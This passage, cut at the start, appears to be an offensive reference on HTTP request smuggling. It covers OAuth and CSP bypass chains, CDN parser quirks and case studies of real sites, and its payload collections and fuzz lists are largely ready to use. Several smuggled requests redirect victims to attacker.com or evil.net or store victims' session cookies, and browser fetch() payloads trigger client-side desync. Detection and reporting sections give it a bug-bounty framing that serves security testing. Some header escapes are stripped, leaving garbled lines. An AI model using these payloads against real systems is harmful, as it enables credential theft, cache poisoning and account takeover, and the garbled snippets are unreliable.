6. Redirected iframe to that page, gaining parent access.
7. Stole plaintext PayPal passwords from Safari and IE users.

---

## OAuth Exploitation Chains

### OAuth + Request Smuggling

OAuth flows are particularly vulnerable to request smuggling because:
- They involve multiple redirects with sensitive tokens in URLs.
- The `code` parameter is passed via query string and reflected in `Referer`.
- State parameters may be predictable or bypassable.

### Attack Chain: Stealing OAuth Codes

1. Find an H2.TE or CL.TE vulnerability on the OAuth provider or relying party.
2. Smuggle a prefix that redirects the victim to the attacker's domain.
3. The victim completes OAuth login; the `code` is sent to the attacker's redirect_uri.
4. If the redirect is blocked, the `code` may still leak via `Referer` when the victim's browser loads attacker resources.

**Verizon / AOL case study:**

Redirecting live users during OAuth login at `id.b2b.oath.com` caused their browsers to send:

```http
GET /b2blanding/show/oops HTTP/1.1
Host: psres.net
Referer: https://id.b2b.oath.com/?...&code=secret
```

### Attack Chain: OAuth State Bypass

If the state parameter is stored server-side and looked up via a cookie, request smuggling can be used to:
1. Initiate an OAuth flow with a legitimate state.
2. Smuggle a request that completes the flow with the attacker's code but the victim's session.
3. The back-end associates the attacker's OAuth account with the victim's session.

### Hidden OAuth Attack Vectors

PortSwigger research identified additional OAuth vulnerabilities:
- **Dynamic client registration**: Attacker registers a malicious client with a redirect_uri under their control.
- **Open redirect in OAuth endpoint**: Used to bypass redirect_uri validation.
- **PKCE downgrade**: Force the client to use implicit flow instead of PKCE.

When combined with request smuggling, these can be exploited at scale without user interaction.

---

## CSP Bypass Chains

### CSP + Request Smuggling

Content Security Policy (CSP) is a defense-in-depth mechanism. Request smuggling can bypass CSP by:
1. Poisoning JavaScript resources that are allowed by `script-src`.
2. Using open redirects (which bypass some CSP implementations) to load attacker-controlled scripts.
3. Exploiting iframes or sub-pages with weaker or missing CSP.

### PayPal CSP Bypass Chain

1. Login page CSP: `script-src c.paypal.com` — blocked direct redirect.
2. Dynamically generated iframe on `c.paypal.com` had **no CSP** and imported poisoned JS.
3. Controlled iframe but SOP prevented reading parent.
4. Found `paypal.com/us/gifts` — no CSP, imported same poisoned JS.
5. Redirected iframe to `paypal.com/us/gifts`, which executed attacker JS in `paypal.com` origin.
6. Parent access granted → password theft.

### CSP Policy Injection

PortSwigger research demonstrated that if an attacker can control part of the CSP header value (e.g., via reflected parameter in `Content-Security-Policy-Report-Only`), they can inject `unsafe-inline` or whitelist their own domains.

When chained with request smuggling to poison the CSP header response for all users:
```http
POST / HTTP/1.1
Host: victim.com
Content-Length: 64
Transfer-Encoding: chunked

0
GET / HTTP/1.1
Host: victim.com
Content-Security-Policy: default-src 'self'; script-src 'unsafe-inline' https://attacker.com
Foo: X
```

---

## Parser Confusion Payloads

### HTTP/1 Parser Discrepancies

Different servers parse HTTP messages differently. Key discrepancies:

| Feature | Lenient Parsers | Strict Parsers |
|---------|----------------|----------------|
| `Transfer-Encoding: xchunked` | Ignores (falls back to CL) | Rejects or processes |
| `Transfer-Encoding : chunked` (space before colon) | Ignores | Processes |
| `Transfer-Encoding:[tab]chunked` | Processes | Ignores |
| Leading whitespace on header name | Ignores | Processes or rejects |
| LF instead of CRLF | Accepts | Rejects |
| Multiple spaces in request line | Accepts | Rejects |

### HTTP/2 Parser Discrepancies

HTTP/2's binary format removes delimiter-based ambiguity, but introduces new issues:

| Feature | Front-End | Back-End |
|---------|-----------|----------|
| Newlines in header values | Allowed (binary) | Rejects after downgrade |
| Colons in header names | Allowed | Rejects after downgrade |
| Spaces in `:method` | Allowed | Rejects |
| Multiple `:path` | Uses first | Uses last |
| `:authority` vs `host` | Uses `:authority` | Uses `host` |

### Request Line Injection

Apache mod_proxy allows spaces in `:method`, enabling request line injection:

```
:method  GET /admin HTTP/1.1
:path    /fakepath
:authority psres.net
```

Downgraded:
```http
GET /admin HTTP/1.1  /fakepath HTTP/1.1
Host: internal-server
```

This bypasses `<ProxyMatch "/admin"> Deny from all` because the request line hits `/admin` before the parsed path.

### Line Folding for Header Tampering

If the front-end allows space-prefixed header names and the back-end supports line-folding:

```
poison: x
 user-agent: burp
```

Downgraded:
```http
poison: x
User-Agent: burp
```

The space-header folds into the previous header, tampering with internal headers like `Request-Id`.

---

## CDN-Specific Behaviors

### Akamai

- **Historical CL.TE**: Front-end didn't support chunked encoding in requests; back-end did. Classic CL.TE worked extensively. Fixed ~48 hours after 2019 research publication.
- **CSD on redirects**: Akamai ignores CL on redirect responses. Enables client-side desync via POST to redirect endpoints.
- **Double Akamai layers**: Desync between two Akamai layers allowed serving content from anywhere on the Akamai network.

### Cloudflare

- Generally immune to classic request smuggling due to strict HTTP parsing.
- Vulnerable to H2C smuggling if origin supports HTTP/2 cleartext and the `Upgrade: h2c` path is not properly validated.
- Cache poisoning possible if response headers are improperly normalized.

### AWS CloudFront / ALB

- **AWS ALB H2.TE**: Failed to strip `transfer-encoding: chunked` from HTTP/2 requests. Downgraded them with TE intact, enabling H2.TE on almost every ALB-backed site. Fixed within 5 days of report.
- **AWS ALB surprise desync**: ALB added `Transfer-Encoding: chunked` during downgrade when the HTTP/2 request had no `content-length` (explicitly acceptable in HTTP/2). The body was left unchanged, creating instant desync.

### Netlify

- Used `:scheme` to construct URLs without validation → URL prefix injection.
- Allowed `
` in header values → header injection → H2.TE desync.
- Vulnerable to response queue poisoning via request splitting.

### F5 BIG-IP

- Vulnerable to TE.TE via header obfuscation (advisory K50375550).
- Vulnerable to H2.X request splitting (advisory K97045220).
- Connection-state attacks: first-request validation/routing issues.

### Imperva Cloud WAF

- Failed to strip `transfer-encoding` from HTTP/2 requests.
- Every website using Imperva Cloud WAF was vulnerable to H2.TE request smuggling.

### Varnish

- **Pause-based desync**: Varnish's `synth()` feature leaves connections open for reuse after timeout. If headers are sent promising a body, but the body never arrives, Varnish times out but keeps the connection open. The delayed body is then interpreted as a new request.
- Configurable timeout (default 15s) creates a window for attack.

### PulseSecure Virtual Traffic Manager

- Vulnerable to H2.X request splitting (Atlassian Jira case study).
- Allowed newlines in header values initially; hotfix blocked values but not names.
- Allowed colons in header names → header name splitting.
- Allowed `
` without `` → bypass of CRLF filter.

---

## Browser Quirks

### Connection Pools

Browsers maintain separate connection pools:
- **With cookies** vs **without cookies**.
- **HTTP/1.1** vs **HTTP/2**.
- **Same-origin** vs **cross-origin**.

For CSD attacks, always use `credentials: 'include'` to poison the "with-cookies" pool, because top-level navigations use that pool.

### Mixed Content Handling

If a redirect forces HTTP on an HTTPS site:
- **Chrome/Firefox**: Block mixed content.
- **Internet Explorer**: Mixed-content protection can be completely bypassed in some configurations.
- **Safari**: Auto-upgrades to HTTPS if the target is in the HSTS cache.

### Redirect Following Behavior

- **307 redirects**: Browsers resend POST data to the new destination. Can be used to make victims send plaintext passwords to attacker servers.
- **CORS preflight**: If a redirect crosses origins with custom headers, the browser may send an `OPTIONS` preflight. The attacker can respond with `Access-Control-Allow-Headers: authorization` to steal Bearer tokens.

### Stacked Response Problem

Browsers discard connections if they receive more response data than the `Content-Length` indicates. This breaks HEAD-stacking techniques unless:
1. The HEAD response is delayed (cache miss, slow endpoint).
2. The extra data is consumed by a predicted chunk size.
3. The connection is kept alive via `Connection: keep-alive` and exact byte counting.

### HSTS and Redirect Caching

Safari's HSTS cache can auto-upgrade HTTP redirects to HTTPS, breaking attacks that rely on plaintext interception. Target non-HSTS domains or use protocol-relative URLs.

---

## Gadget Chains

### Gadget Definition

A **gadget** is a benign feature of the target application that becomes exploitable when combined with request smuggling. Gadgets are application-specific, but common patterns exist.

### Host-Header Redirect Gadget

Apache and IIS default behavior: request a folder without trailing slash → 301 redirect to folder with slash, using the `Host` header value:

```http
GET /etc/libs/xyz.js HTTP/1.1
Host: redacted

→ 301 Location: https://redacted/etc/libs/xyz.js/
```

With smuggling:
```http
POST /etc/libs/xyz.js HTTP/1.1
Host: redacted
Content-Length: 57
Transfer-Encoding: chunked

0
POST /etc HTTP/1.1
Host: burpcollaborator.net
X: X
```

Victim receives:
```http
HTTP/1.1 301 Moved Permanently
Location: https://burpcollaborator.net/etc/
```

### Reflected Parameter Gadget

Find a POST endpoint that reflects a parameter into the response. Position the parameter last. Smuggle with overlong CL. The next user's request gets appended into the parameter value and reflected back, leaking headers/cookies.

**Trello case study:**

```http
POST /1/cards HTTP/1.1
Host: trello.com
Transfer-Encoding:[tab]chunked
Content-Length: 49

f
PUT /1/members/1234 HTTP/1.1
Host: trello.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
x=x&csrf=1234&username=testzzz&bio=cake
0

GET / HTTP/1.1
Host: trello.com
```

Victim's request ended up saved in the attacker's profile bio, exposing all headers and cookies.

### Storage Gadget (Comment, Email, Profile)

Any function that stores text data: comments, emails, profile descriptions, contact forms.

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
csrf=...&postId=2&name=...&email=...&website=...&comment=

GET / HTTP/1.1
Host: vulnerable-website.com
```

The victim's request (including their session cookie) is stored as a comment.

### DOM Clobbering + Request Smuggling

If a page uses DOM clobbering-vulnerable patterns (e.g., `document.location` assignment based on query parameters), request smuggling can control the query string the **server** sees, while the browser sees the original URL.

**Red Hat case study:**

```http
POST /css/style.css HTTP/1.1
Host: www.redhat.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
Transfer-Encoding: chunked

0
POST /search?dest=../assets/idx?redir=//redhat.com@evil.net/ HTTP/1.1
Host: www.redhat.com
Content-Length: 15

x=
```

The victim browser receives a 301 to `../assets/idx?redir=//redhat.com@evil.net/`, which then executes a DOM-based open redirect.

### Internal API Access Gadget

Smuggle requests to internal APIs with front-end-injected headers:

**New Relic case study:**

```http
POST /login HTTP/1.1
Host: login.newrelic.com
Content-Length: 564
Transfer-Encoding: chunked
Transfer-encoding: cow

0
POST /internal_api/934454/session HTTP/1.1
Host: alerts.newrelic.com
X-Forwarded-Proto: https
Service-Gateway-Account-Id: 934454
Service-Gateway-Is-Newrelic-Admin: true
Content-Length: 6

x=123
```

Gained full admin-level access to internal API by smuggling headers that the front-end would normally strip or rewrite.

---

## Real World Case Studies

### 1. PayPal Login Page Compromise
- **Vector**: CL.TE request smuggling + cache poisoning.
- **Target**: c.paypal.com JS resource.
- **Chain**: Poison JS redirect -> CSP bypass via iframe -> SOP bypass via second page -> password theft.
- **Impact**: Persistent XSS on login page, plaintext password theft for Safari/IE users.
- **Bounty**: Undisclosed (critical).

### 2. Netflix Account Takeover (CVE-2021-21295)
- **Vector**: H2.CL desync on Zuul/Netty.
- **Impact**: Redirect arbitrary users, steal passwords and credit cards, mass account compromise.
- **Bounty**: $20,000 (max bounty).

### 3. Atlassian Jira Response Queue Poisoning ($15,000)
- **Vector**: H2.X request splitting via PulseSecure VTM.
- **Impact**: Users received responses intended for others. Set-Cookie headers caused account cross-login.
- **Bounty**: $15,000 (triple max bounty).

### 4. Amazon.com H2.0 / CL.0
- **Vector**: H2.0 desync on /b/ endpoint.
- **Impact**: Stored live users' complete requests (auth tokens) in attacker's shopping list.
- **Missed opportunity**: Could have created a self-replicating desync worm via browser fetch().

### 5. Verizon / AOL OAuth Token Theft ($7,000 + $10,000)
- **Vector**: H2.TE on AWS ALB -> Verizon id.b2b.oath.com.
- **Impact**: Redirected OAuth flows, stole authorization codes via Referer, harvested Bearer tokens via CORS preflight manipulation.
- **Bounty**: $7,000 + $10,000.

### 6. Netlify CDN Full Takeover ($4,000)
- **Vector**: H2.TE via CRLF header injection.
- **Impact**: Persistent control over every page on every site on Netlify CDN.
- **Bounty**: $4,000.

### 7. New Relic Internal API Admin Access
- **Vector**: TE.TE (F5 BIG-IP) + header reflection.
- **Impact**: Leaked internal headers, gained admin access to internal API via Service-Gateway-Is-Newrelic-Admin: true.
- **Root cause**: F5 gateway weakness (advisory K50375550).

### 8. Akamai-to-Akamai CDN Chaining
- **Vector**: CL.TE between two Akamai layers.
- **Impact**: Served arbitrary Akamai network content on victim's domain.

### 9. Trello Credential Harvesting
- **Vector**: TE.TE via tab-obfuscated header.
- **Impact**: Stored victim requests in attacker profile, exposing session cookies and headers.

### 10. Cisco WebVPN Client-Side Cache Poisoning (CVE-2022-20713)
- **Vector**: CSD on Cisco ASA WebVPN.
- **Impact**: Poisoned browser cache for JS resources, executed attacker JS in VPN context.
- **Note**: Cisco declared product deprecated but assigned CVE.

---

## Fuzzing Payloads

### Classic Desync Fuzzing

```http
POST /FUZZ HTTP/1.1
Host: TARGET
Content-Length: CALC
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Host: TARGET
```

### TE.TE Obfuscation Fuzz List

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[
]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
Transfer-Encoding: chun\x00ked
Transfer-Encoding: chun ked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: cow
Foo: bar
Transfer-Encoding: chunked
```

### HTTP/2 Header Injection Fuzz List

```
foo: bar
Transfer-Encoding: chunked
foo: bar

GET /admin HTTP/1.1
foo: bar
Transfer-Encoding: chunked
foo: bar
Host: attacker.com
:method: GET /admin HTTP/1.1
Transfer-encoding: chunked
:scheme: http://attacker.com/?
:path: /
Host: attacker.com
host: attacker.com
:authority: attacker.com
```

### CL.0 Endpoint Fuzz List

Target endpoints that typically don't accept POST:
```
/favicon.ico
/robots.txt
/sitemap.xml
/.well-known/security.txt
/static/
/assets/
/css/
/js/
/images/
/redirect
/404
/%2e%2e
/..
/.
//
/%2f
```

### Chunked Encoding Fuzz List

```
0
00
000
00000000
0;comment
0;ext=val
0


0


000


0;


0x0


-1


ffffffff


```

---

## Automation Workflows

### HTTP Request Smuggler + Turbo Intruder Pipeline

1. **Discovery**: Use HTTP Request Smuggler (Burp extension) to scan all in-scope endpoints.
2. **Confirmation**: For timeouts detected, use Turbo Intruder with requestsPerConnection=1 to avoid pipelining false positives.
3. **Exploitation**: Switch to Burp Repeater for manual confirmation, then Turbo Intruder for high-speed victim request spraying.
4. **Cache Poisoning**: Use Turbo Intruder with cache-busters to test cache behavior.

### Turbo Intruder HTTP/2 Setup

```python
from turbo_intruder import *

def queueRequests(target, wordlists):
    engine = Engine.HTTP2  # or Engine.BURP2 for Burp's native stack
    req = '''
POST /example HTTP/2
Host: target.com
Content-Length: 4

abcdGET /admin HTTP/1.1
Host: target.com
'''
    for i in range(100):
        req = req.replace('abcd', 'abcd')
        engine.queue(target.req, req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if 'admin' in req.response:
        table.add(req)
```

### Automated Detection Logic

**CL.TE timeout detection:**
```http
POST /about HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 41

Z
Q
```
- Front-end forwards 41 bytes.
- Back-end expects chunk size after Z; hangs -> timeout.

**TE.CL timeout detection:**
```http
POST /about HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 60

0

X
```
- Front-end sees 0 chunk -> complete -> forwards blue text.
- Back-end reads 60 bytes, gets 0

X -> hangs waiting for remaining 56 bytes.

**Pause-based detection:**
Send headers promising a body, wait 10-15 seconds. If server responds before body is sent, front-end interpreted message as complete (secure). If it hangs, front-end is waiting for more data (potential vulnerability).

### Nuclei Automation

Use Nuclei with the request-smuggling templates for initial recon:

```bash
nuclei -u https://target.com -t http/misconfiguration/request-smuggling/ -rate-limit 10
```

---

## Recon Methodology

### Step 1: Identify Architecture

- Does the target use a CDN? (Cloudflare, Akamai, Fastly, CloudFront)
- Does the target use a load balancer? (AWS ALB, F5, Nginx, HAProxy)
- Is HTTP/2 advertised? Check ALPN via TLS handshake.
- Is HTTP/2 supported but hidden? Test with --http2-prior-knowledge.

### Step 2: Endpoint Enumeration

- Test **every endpoint individually**. Different endpoints may route to different back-ends.
- Prioritize endpoints that accept POST data (for CL.TE/TE.CL) and endpoints that don't (for CL.0/H2.0).
- Test static files, redirects, error pages for CL.0/H2.0.

### Step 3: Protocol Testing

- **HTTP/1.1**: Test CL.TE, TE.CL, TE.TE with classic payloads.
- **HTTP/2**: Test H2.CL, H2.TE, H2.X splitting, H2.0.
- **H2C**: Test Upgrade: h2c behavior.

### Step 4: Header Obfuscation Matrix

For each endpoint, test the full matrix of TE obfuscation techniques. Use HTTP Request Smuggler's auto-detection.

### Step 5: Connection Behavior Analysis

- Send ambiguous request + normal request over **same connection**.
- If victim request affected -> cross-user possible.
- If only attacker's own requests affected -> connection-locked; pivot to tunnelling or cache poisoning.
- Test from different IPs to determine IP-based connection locking.

### Step 6: Gadget Discovery

- Find reflected parameters (for header leaking).
- Find storage functions (for credential capture).
- Find redirect behavior (for open redirect / JS hijacking).
- Find cache usage (for cache poisoning/deception).
- Find internal API endpoints (for header-based auth bypass).

### Step 7: Impact Escalation

- Can you affect other users? (cross-user desync)
- Can you poison the cache? (persistent attack)
- Can you steal credentials? (storage gadget)
- Can you execute JavaScript? (redirect + CSP bypass)
- Can you access internal APIs? (internal header injection)

---

## Nuclei Templates

### Template Logic Overview

Nuclei request-smuggling templates typically:
1. Send a desync probe (timeout-based or differential-response-based).
2. Look for time delays, specific error messages, or differential responses.
3. Use raw HTTP requests with exact byte control.

### Key Template Categories

```
http/misconfiguration/request-smuggling/
├── cl-te-request-smuggling.yaml
├── te-cl-request-smuggling.yaml
├── h2-cl-request-smuggling.yaml
├── h2-te-request-smuggling.yaml
├── h2c-smuggling.yaml
├── cl-0-request-smuggling.yaml
└── response-queue-poisoning.yaml
```

### Example Template Logic (Conceptual)

```yaml
id: cl-te-smuggling
info:
  name: CL.TE HTTP Request Smuggling
  severity: critical

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 13
        Transfer-Encoding: chunked

        0

        SMUGGLED
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          # Follow-up request would be needed for confirmation
```

**Note**: Nuclei templates for request smuggling are primarily **detection** oriented. Confirmation usually requires manual follow-up or multi-request sequences that are difficult to express in declarative templates.

### Running Nuclei for Request Smuggling

```bash
# Basic scan
nuclei -u https://target.com -t http/misconfiguration/request-smuggling/

# With custom headers
nuclei -u https://target.com -t http/misconfiguration/request-smuggling/ -H "User-Agent: Mozilla/5.0"

# Rate limited to avoid collateral damage
nuclei -u https://target.com -t http/misconfiguration/request-smuggling/ -rl 5

# Against a list of targets
nuclei -l targets.txt -t http/misconfiguration/request-smuggling/ -o smuggling-results.txt
```

---

## Tools and Scanners

### HTTP Request Smuggler (PortSwigger)

- **Type**: Burp Suite Extension (BApp Store).
- **Capabilities**: Auto-detects CL.TE, TE.CL, TE.TE, H2.CL, H2.TE, CL.0, CSD vectors.
- **Features**: Timeout-based detection, pause-based detection, connection-state probes, turbo intruder integration.
- **Usage**: Right-click request -> "Launch HTTP Request Smuggler" -> select detection methods.

### Turbo Intruder

- **Type**: Burp Suite Extension / Standalone Python.
- **Capabilities**: High-speed HTTP/1 and HTTP/2 request sending with exact byte control.
- **HTTP/2**: Use Engine.HTTP2 or Engine.BURP2.
- **Character mappings for HTTP/2 attacks**:
  - ^ -> 
  - ~ -> 

- **Settings**: requestsPerConnection, concurrentConnections, pipeline control connection reuse.

### Smuggler (defparam)

- **Type**: Python 3 CLI tool.
- **GitHub**: github.com/defparam/smuggler
- **Usage**:
```bash
python3 smuggler.py -u https://target.com -v 2
```

### h2csmuggler (BishopFox)

- **Type**: Python tool for H2C smuggling.
- **GitHub**: github.com/BishopFox/h2csmuggler
- **Usage**:
```bash
python3 h2csmuggler.py -u https://target.com
```

### http2smugl

- **Type**: Go tool for HTTP/2 smuggling tests.
- **GitHub**: github.com/neex/http2smugl

### Param Miner

- **Type**: Burp Suite Extension.
- **Capabilities**: Guesses internal header names via request tunnelling. Updated to support tunnelling-based internal header detection.
- **Usage**: Right-click request -> "Guess headers" -> enable tunnelling mode.

### Burp Suite Scanner

- Native detection of request smuggling vulnerabilities in Burp Suite Professional.
- HTTP/2 testing capabilities in Inspector panel (pseudo-headers, newline injection, etc.).

### Custom curl for Hidden HTTP/2

```bash
curl --http2 --http2-prior-knowledge https://target.com/
curl --http2 -v https://target.com/  # Check ALPN negotiation
```

---

## Advanced Research

### Pause-Based Desync

**Discovery**: Varnish's synth() feature + custom 5-second timeout. The researcher accidentally used a 10-second timeout instead of 2 seconds.

**Mechanism**: Send headers promising a body, then pause. Varnish times out after 15 seconds of inactivity but leaves the connection open for reuse. When the attacker finally sends the body, Varnish interprets it as a new request.

**Apache Pause-Based Desync**: Similar behavior in Apache when configured with aggressive timeout settings.

### 0.CL Request Smuggling

Historically considered unexploitable because of connection deadlocks. Breakthrough: combine with **early-response gadget** (make back-end respond before receiving complete body), then use **double desync** to build full exploit.

See whitepaper: **HTTP/1.1 Must Die** (PortSwigger Research).

### Request Tunnelling

When front-ends never reuse back-end connections, traditional cross-user smuggling is impossible. However, the attacker can still:
1. **Smuggle a complete request** to the back-end.
2. **Read the response** (if front-end passes it through).
3. **Bypass front-end security rules** (path restrictions, WAFs).
4. **Inject internal headers** that the front-end would normally strip.

**HEAD technique for blind tunnelling**: Use HEAD instead of POST to make the back-end return headers + Content-Length but no body. The front-end over-reads the socket and passes part of the second response to the attacker.

```http
HEAD /images/tiny.png HTTP/1.1
Transfer-Encoding: chunked

0
POST / HTTP/1.1
...
```

Back-end response to HEAD:
```http
HTTP/1.1 200 OK
Content-Length: 7
```

Front-end reads 7 bytes of the next response and passes them to the attacker.

### Internal Header Leaking via Body-Start Confusion

With HTTP/2 newline injection, cause disagreement about where the body **starts** (not where it ends):

HTTP/2 request:
```
:method  POST
:path    /blog
:authority bitbucket.org
foo      bar

Host: bitbucket.wpengine.com

Content-Length: 200

s=cow

foo=bar
```

Downgraded:
```http
POST /blog HTTP/1.1
Foo: bar
Host: bitbucket.wpengine.com
Content-Length: 200
s=cow
SSLClientCipher: TLS_AES_128
Host: bitbucket.wpengine.com
Content-length: 7
foo=bar
```

Both servers think there's one request, but disagree where the body starts. The front-end inserts internal headers **after** what it thinks are headers. The back-end treats those internal headers as part of the s parameter, reflecting them in the WordPress search results.

### Desync Worms

A **self-replicating attack** where each exploited victim re-launches the attack against others.

**Amazon.com missed opportunity**: The H2.0 attack was so vanilla that it could have been triggered by fetch() in victim browsers. An XSS gadget could execute JavaScript that re-triggered the desync, spreading to all active users with no interaction.

**Requirements for desync worm:**
1. Browser-compatible desync vector (CL.0 or valid HTTP/2 request).
2. XSS or JS execution gadget on the target domain.
3. The smuggled request causes storage of the next victim's request.
4. The stored request contains enough data to re-trigger the worm.

---

## Bug Bounty Writeups

### Key Takeaways from Real Reports

1. **Always prove impact with minimal collateral**: Use timeout-based detection first. Use cache-busters on victim requests. Target low-traffic regions/timezones.

2. **Staging > Production**: If staging exists, prove the vulnerability there first. Only move to production for final impact demonstration.

3. **Chain low-severity findings**: A harmless open redirect + request smuggling = account takeover. A reflected XSS in a header + request smuggling = mass exploitation.

4. **Document the full chain**: Don't just report "request smuggling exists." Show: desync -> socket poisoning -> gadget discovery -> credential theft / cache poisoning / internal access.

5. **Be patient with triagers**: Many triagers are unfamiliar with request smuggling. Provide clear reproduction steps, screenshots, and video if possible.

### Report Structure Template

```
Title: HTTP Request Smuggling (H2.TE) -> Persistent Cache Poisoning -> Account Takeover

1. Summary: Brief description of the vulnerability class and impact.
2. Affected Endpoint: Specific URL where desync was confirmed.
3. Desync Vector: H2.CL / H2.TE / CL.TE / TE.CL / CL.0 / etc.
4. Reproduction Steps:
   a. Send ambiguous request (include exact raw HTTP).
   b. Send victim request (include exact raw HTTP).
   c. Show altered response.
5. Impact Demonstration:
   - Cache poisoning screenshot.
   - Redirect to attacker domain.
   - Session token leakage.
6. Affected Users: All users requesting /static/include.js.
7. Suggested Fix: Use HTTP/2 end-to-end, or validate downgraded requests.
```

---

## Payload Collections

### Master Payload List (Deduplicated)

#### CL.TE
```http
POST / HTTP/1.1
Host: {{target}}
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

```http
POST / HTTP/1.1
Host: {{target}}
Content-Length: 6
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
Host: {{target}}
```

#### TE.CL
```http
POST / HTTP/1.1
Host: {{target}}
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

```http
POST / HTTP/1.1
Host: {{target}}
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0

```

#### TE.TE (Obfuscation)
```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[
]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

#### H2.CL
```
:method  POST
:path    /n
:authority {{target}}
content-length 4

abcdGET /n HTTP/1.1
Host: attacker.com
Foo: bar
```

#### H2.TE
```
:method  POST
:path    /
:authority {{target}}
transfer-encoding chunked

0
GET /admin HTTP/1.1
Host: attacker.com
```

#### H2.X (Request Splitting)
```
:method  GET
:path    /
:authority {{target}}
foo      bar


GET /robots.txt HTTP/1.1

X-Ignore: x
```

#### CL.0 / H2.0
```http
POST /favicon.ico HTTP/1.1
Host: {{target}}
Content-Length: 23

GET /404 HTTP/1.1
X: Y
```

```
:method  POST
:path    /b/
:authority {{target}}
Content-Length: 23

GET /404 HTTP/1.1
X: X
```

#### CSD (Browser-Powered)
```javascript
fetch('https://{{target}}/favicon.ico', {
    method: 'POST',
    body: "GET /404 HTTP/1.1
X: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://{{target}}/'
});
```

```javascript
fetch('https://{{target}}/assets', {
    method: 'POST',
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1
Host: {{target}}

GET /x?x=<script>alert(1)</script> HTTP/1.1
X: Y`,
    credentials: 'include',
    mode: 'cors'
}).catch(() => {
    location = 'https://{{target}}/'
});
```

---

## WAF Bypasses

### WAF + Request Smuggling Interaction

Request smuggling **bypasses WAFs by design** because:
1. The WAF (front-end) sees a benign, well-formed request.
2. The malicious payload is hidden in the body or interpreted differently by the back-end.
3. The WAF never sees the smuggled request that actually hits the back-end.

### Specific WAF Bypass Techniques

**Barracuda WAF + IIS**: Vulnerable to `Transfer-Encoding : chunked` (space before colon). Barracuda ignored the header; IIS processed it.

**Imperva Cloud WAF**: Failed to strip `transfer-encoding` from HTTP/2 requests. Every Imperva-protected site was vulnerable to H2.TE.

**AWS WAF + ALB**: ALB's HTTP/2 downgrade added TE without validating body. WAF inspected the HTTP/2 request (clean) but the back-end saw the downgraded HTTP/1.1 with TE smuggling.

### WAF Evasion via HTTP/2

Since many WAFs only inspect HTTP/1.1 traffic or HTTP/2 at the frame level without full semantic analysis:
- Inject newlines inside header values to bypass header-based WAF rules.
- Use request splitting to make the WAF see a different request than the back-end.
- Use H2C to speak HTTP/2 directly to the back-end, bypassing HTTP/1.1 WAF inspection entirely.

---

## Detection Techniques

### Timeout-Based Detection (Safe)

**CL.TE detector:**
```http
POST /about HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 41

Z
Q
```
- Vulnerable: Back-end hangs, connection times out.
- Safe: No back-end socket poisoning occurs because the front-end forwards the body.

**TE.CL detector:**
```http
POST /about HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 60

0

X
```
- Vulnerable: Back-end hangs waiting for remaining bytes.
- Safe: If CL.TE is present, front-end rejects due to invalid chunk size X, preventing poisoning.

### Differential Response Detection

Send two requests:
1. Ambiguous request.
2. Normal request.

If response 2 is unexpected (404 when requesting /, different headers, etc.), desync confirmed.

**Warning**: On live sites, another user's request may hit the poisoned socket before yours. Use cache-busters and Turbo Intruder for speed.

### Pause-Based Detection

Send headers, promise a body, wait 10-15 seconds:
- If server responds early -> front-end interpreted message as complete.
- If server hangs -> front-end waiting for more data (potential vulnerability).

### HTTP/2-Specific Detection

1. Send HTTP/2 request with malformed content-length.
2. Send HTTP/2 request with transfer-encoding: chunked.
3. Send HTTP/2 request with newlines in header values.
4. Check downgraded HTTP/1.1 output for injected headers or split requests.

### Connection-State Probes

Test for first-request validation/routing:
```http
GET / HTTP/1.1
Host: allowed.com
GET / HTTP/1.1
Host: internal.allowed.com
```

Use HTTP Request Smuggler's connection-state probe option.

### Response Queue Poisoning Detection

Smuggle exactly two requests. In HTTP/2, if the response body contains HTTP/1.1 status lines (e.g., HTTP/1.1 200 OK), you've found response queue poisoning or tunnelling.

---

## References

### Primary Research Papers

1. **HTTP Desync Attacks: Request Smuggling Reborn** — James Kettle, PortSwigger, Black Hat / DEF CON 2019.
   - https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

2. **HTTP/2: The Sequel is Always Worse** — James Kettle, PortSwigger, Black Hat / DEF CON 2021.
   - https://portswigger.net/research/http2

3. **Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling** — James Kettle, PortSwigger, Black Hat / DEF CON 2022.
   - https://portswigger.net/research/browser-powered-desync-attacks

4. **HTTP/1.1 Must Die** — PortSwigger Research (0.CL / double desync).
   - https://portswigger.net/research/http1-must-die

5. **Practical Web Cache Poisoning** — James Kettle, PortSwigger.
   - https://portswigger.net/research/practical-web-cache-poisoning

6. **Web Cache Entanglement** — James Kettle, PortSwigger.
   - https://portswigger.net/research/web-cache-entanglement

7. **Cracking the Lens: Targeting HTTPS Hidden Attack Surface** — James Kettle, PortSwigger.
